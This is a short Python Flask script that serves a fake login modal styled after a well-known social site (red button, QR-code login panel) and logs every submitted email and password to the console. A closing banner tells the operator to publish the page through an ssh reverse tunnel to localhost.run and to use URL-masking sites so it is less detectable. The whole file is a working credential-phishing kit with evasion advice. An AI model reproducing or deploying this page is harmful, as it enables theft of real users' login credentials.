from flask import Flask, render_template_string, request

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Modal</title>

<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #f1f1f1;
}

.overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.5);
    display: flex;
    justify-content: center;
    align-items: center;
}

.modal {
    background: white;
    width: 90%;
    max-width: 850px;
    border-radius: 20px;
    display: flex;
    overflow: hidden;
    position: relative;
}

.left {
    flex: 1;
    padding: 40px;
}

.left h2 {
    margin-bottom: 20px;
}

input {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border-radius: 10px;
    border: 1px solid #ccc;
    font-size: 14px;
}

button {
    width: 100%;
    padding: 12px;
    background: #e60023;
    color: white;
    border: none;
    border-radius: 25px;
    font-size: 16px;
    cursor: pointer;
    margin-top: 10px;
}

button:hover {
    background: #cc001f;
}

.link {
    font-size: 13px;
    margin-top: 10px;
}

.right {
    flex: 1;
    background: #fafafa;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 40px;
}

.qr {
    width: 150px;
    height: 150px;
    background: #ddd;
    margin-bottom: 20px;
}

.close {
    position: absolute;
    top: 20px;
    right: 30px;
    font-size: 22px;
    cursor: pointer;
}
</style>

</head>
<body>

<div class="overlay">
    <div class="modal">

        <div class="close">×</div>

        <!-- FORM START -->
        <form method="POST" action="/login" class="left">
            <h2>Welcome Back</h2>

            <input type="text" name="username" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>

            <div class="link">Forgot your password?</div>

            <button type="submit">Log in</button>

            <div class="link">Not a user? Sign up</div>
        </form>
        <!-- FORM END -->

        <!-- RIGHT -->
        <div class="right">
            <div class="qr"></div>
            <h3>Log in instantly</h3>
            <p style="text-align:center; font-size:14px;">
                Scan QR code with your phone to login
            </p>
        </div>

    </div>
</div>

</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    print(f"[DEBUG] Username: {username}, Password: {password}")

    return f"<h2 style='text-align:center;color:green;'>✅ Login received for {username}</h2><a href='/'>Back</a>"

if __name__ == '__main__':
    app.run(host='localhost', port=8080)


print(""" 
#####################################################################################################################
#                                                                                                                    #
#             open new terminal and do ssh -R 80:localhost:8080 nokey@localhost.run  to make it public.              #
#                                                                                                                    #
######################################################################################################################

#####################################################################################################################
#                                                                                                                    #
#                                  Use mask url websites to make it more undectable                                  #
#                                                                                                                    #
######################################################################################################################

""")
